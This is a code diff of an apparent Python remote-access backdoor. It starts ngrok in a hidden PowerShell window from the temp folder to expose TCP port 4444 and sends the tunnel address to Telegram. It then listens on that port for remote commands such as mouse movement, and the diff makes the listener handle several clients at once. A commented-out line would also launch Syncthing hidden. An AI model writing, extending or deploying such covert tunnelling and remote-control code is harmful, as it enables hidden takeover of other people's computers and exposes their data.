@@ -9,8 +9,9 @@ import sys
 from rich import print
 from comand import ngrok_send_Telegram
 
-# Start Process ngrok
+# Start Process ngrok and Syncthing
 run = subprocess.run("powershell Start-Process $env:tmp\/ngrok 'tcp 4444' -WindowStyle Hidden")
+#run = subprocess.run("powershell Start-Process $env:tmp\/syncthing -WindowStyle Hidden")
 time.sleep(4)
 # Send Telegram ip and port
 response = ngrok_send_Telegram()
@@ -21,7 +22,7 @@ def def_handler(sig, frame):
     print("[red][!][/red]  [yellow italic]Saliendo....[/yellow italic]\n\n")
     sys.exit(1)
 
-signal.signal(signal.SIGINT, def_handler)
+signal.signal(signal.SIGINT, def_handler) 
 
 option = options
 
@@ -73,10 +74,17 @@ def mouse_move(letter_option):
 #        \ ' `_  '`_    _    ',/ _::_::_ \ _    _/ _::_::_ \   `.,'.,`., \-,-,-,_,_,
 #        `'~~ `'~~ `'~~ `'~~  \(_)(_)(_)/  `~~' \(_)(_)(_)/ ~'`\_.._,._,'_;_;_;_;_;
 #[/cyan]''')
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((host, 4444))
-        s.listen(3)
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((host, 4444))
+    s.listen(3)
+    while True:
         conexion, addr = s.accept()
+        conexion_start = threading.Thread(target=conexion_client, args=(conexion, addr))
+        conexion_start.start()
+
+def conexion_client(client_conexion, addr):
+    with client_conexion as conexion:
         conexion.sendall(b'###~~~Connect to Server~~~###')
         print ("\n[red][!][/red][yellow]Conexion Realizada con el Cliente[/yellow]\n\n")
         while True:
@@ -111,4 +119,6 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             elif data_client == "ihere":
                     conexion.send(b'ihere')
 
+if __name__ == "__main__":
+    main()
 
